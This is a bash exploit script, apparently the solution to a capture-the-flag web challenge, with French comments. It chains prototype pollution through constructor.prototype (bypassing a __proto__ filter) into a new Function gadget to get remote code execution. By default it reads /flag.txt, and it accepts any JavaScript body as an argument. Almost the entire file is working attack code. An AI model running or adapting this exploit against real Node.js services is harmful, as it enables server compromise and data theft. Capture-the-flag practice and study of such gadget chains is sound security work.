#!/usr/bin/env bash
# Ouroboros — prototype pollution (constructor.prototype) -> new Function gadget -> RCE
# Usage: ./solve.sh <base_url> [js_body]   (js_body par défaut: lit /flag.txt)
set -euo pipefail
U="${1:?base url}"
BODY="${2:-return process.mainModule.require('fs').readFileSync('/flag.txt','utf8')}"
SID=$(curl -s -i "$U/api/login" -X POST -H 'Content-Type: application/json' \
      -d '{"username":"anyone"}' | grep -oiE 'sid=[a-f0-9]+')
# 1) prototype pollution : __proto__ est filtré -> on passe par constructor.prototype
PAYLOAD=$(python3 -c 'import json,sys; print(json.dumps({"settings":{"constructor":{"prototype":{"formula":sys.argv[1]}}}}))' "$BODY")
curl -s -b "$SID" "$U/api/report/config" -X POST -H 'Content-Type: application/json' --data-binary "$PAYLOAD" >/dev/null
# 2) le rendu evalue Object.prototype.formula via new Function(body)() -> resultat dans <div class="computed">
curl -s -b "$SID" "$U/api/report/preview" -X POST -H 'Content-Type: application/json' \
  -d '{"data":{"title":"T","body":"B"}}' | grep -oE '<div class="computed">.*</div>' | sed 's/<[^>]*>//g'
echo
